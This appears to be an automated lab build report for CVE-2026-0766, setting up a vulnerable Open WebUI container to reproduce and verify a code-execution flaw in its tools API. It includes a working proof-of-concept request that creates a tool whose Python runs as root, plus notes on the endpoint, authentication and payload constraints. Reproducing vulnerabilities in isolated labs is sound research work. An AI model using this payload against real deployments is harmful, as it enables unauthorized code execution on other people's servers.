# Lab Build Report: CVE-2026-0766

## CVE ID
CVE-2026-0766

## Lab Architecture

**Single-container architecture** using the official pre-built Docker image `ghcr.io/open-webui/open-webui:v0.6.32`. No external database or LLM backend is required — SQLite is embedded and the vulnerability is in the tools API, not in chat functionality.

### Containers

| Container | Image | Role | Port | Network |
|-----------|-------|------|------|---------|
| `cve-2026-0766-vulnerable` | `ghcr.io/open-webui/open-webui:v0.6.32` | Vulnerable Open WebUI instance | 8080 | `lab-net` |

### Network Configuration
- Container joins `lab-net` (bridge network) for isolated lab access
- Port 8080 mapped to host for PoC access via `localhost:8080`

---

## Container Details

### cve-2026-0766-vulnerable
- **Image**: `ghcr.io/open-webui/open-webui:v0.6.32`
- **Container Name**: `cve-2026-0766-vulnerable`
- **Internal Port**: 8080
- **Volume**: `open-webui-data` → `/app/backend/data` (SQLite DB, uploads, cache)
- **Health Check**: `curl -sf http://localhost:8080/health` (interval: 10s, retries: 30, start_period: 30s)
- **Environment Variables**:
  - `WEBUI_SECRET_KEY=cveforge-lab-secret-key`
  - `ENABLE_SIGNUP=True`
  - `SCARF_NO_ANALYTICS=true`
  - `DO_NOT_TRACK=true`
  - `ANONYMIZED_TELEMETRY=False`
- **Process**: `bash start.sh` → `uvicorn open_webui.main:app --host 0.0.0.0 --port 8080`
- **Runs as**: root (UID 0)

---

## Build Status

| Component | Status | Notes |
|-----------|--------|-------|
| Image Pull | ✅ Success | `ghcr.io/open-webui/open-webui:v0.6.32` (pre-built) |
| Container Start | ✅ Success | Healthy in ~35 seconds |
| Health Check | ✅ Passing | `/health` returns `{"status": true}` |
| API Version | ✅ Verified | `/api/config` returns version `0.6.32` |
| Signup Flow | ✅ Working | First user becomes admin automatically |
| RCE Verification | ✅ Confirmed | `exec()` executes arbitrary Python as root |

---

## Start/Stop Commands

### Start Lab
```bash
docker compose up -d
```

### Stop Lab
```bash
docker compose down
```

### Reset Lab (fresh database)
```bash
docker compose down -v
docker compose up -d
```

---

## Verification Evidence

### 1. Health Check
```
$ curl http://<CONTAINER_IP>:8080/health
{"status":true}
```

### 2. Version Confirmation
```
$ curl http://<CONTAINER_IP>:8080/api/config | jq '.version'
"0.6.32"
```

### 3. Admin Signup (First User)
```
POST /api/v1/auths/signup
{"email":"admin@cveforge.lab","password":"LabPass123","name":"Lab Admin"}

Response: {"role": "admin", "token": "<jwt>", ...}
```

### 4. RCE via Tool Creation
```
POST /api/v1/tools/create
Authorization: Bearer <jwt>
{
  "id": "lab_verify_rce",
  "name": "Lab Verify RCE",
  "content": "import os\nos.system('id > /tmp/cve-2026-0766-pwned')\n\nclass Tools:\n    pass\n",
  "meta": {"description": "Lab verification test", "manifest": {}}
}

$ docker exec cve-2026-0766-vulnerable cat /tmp/cve-2026-0766-pwned
uid=0(root) gid=0(root) groups=0(root)
```

**Code injection executes as root (UID 0) inside the container.**

---

## PoC Agent Notes

### Accessing the Lab
```bash
BASE_URL="http://localhost:8080"
```

### Authentication Flow
1. **Signup** (first user = admin): `POST /api/v1/auths/signup` with `{"email":"...", "password":"...", "name":"..."}`
2. **Token**: Extract `token` field from signup response
3. **Use token**: `Authorization: Bearer <token>` header on all subsequent requests

### Exploitation Endpoint
- **URL**: `POST /api/v1/tools/create`
- **Auth**: Bearer token (admin or user with workspace.tools permission)
- **Payload**: JSON with `content` field containing arbitrary Python code + `Tools` class
- **Execution context**: Root (UID 0) in the container

### Important Constraints
- The `id` field must be a valid Python identifier (alphanumeric + underscores, cannot start with digit)
- Each tool `id` must be unique — use a unique ID per test or delete previous tools
- The `content` field should define a `Tools` class to get a clean 200 response (code runs before the class check regardless)
- The `meta` field requires `description` and `manifest` keys

### Lab Credentials
- **Admin email**: `admin@cveforge.lab` (already registered in current instance)
- **Admin password**: `LabPass123`
- **If resetting**: Use `docker compose down -v && docker compose up -d` for a fresh instance, then re-register

---

## Known Issues

- **Startup time**: Container takes ~30 seconds to become healthy (SvelteKit frontend compilation at startup)
- **No LLM backend**: Chat functionality won't work (no Ollama/OpenAI configured), but this is irrelevant — the vulnerability is in the tools API
- **First-user race**: On a fresh instance, the first user to sign up becomes admin. If the lab is reset, re-registration is required
- **Docker proxy**: If pulling from `ghcr.io` fails through compose, use `docker pull ghcr.io/open-webui/open-webui:v0.6.32` directly first

---

## Files

| File | Path | Description |
|------|------|-------------|
| docker-compose.yml | `CVE-2026-0766/docker-compose.yml` | Lab orchestration |
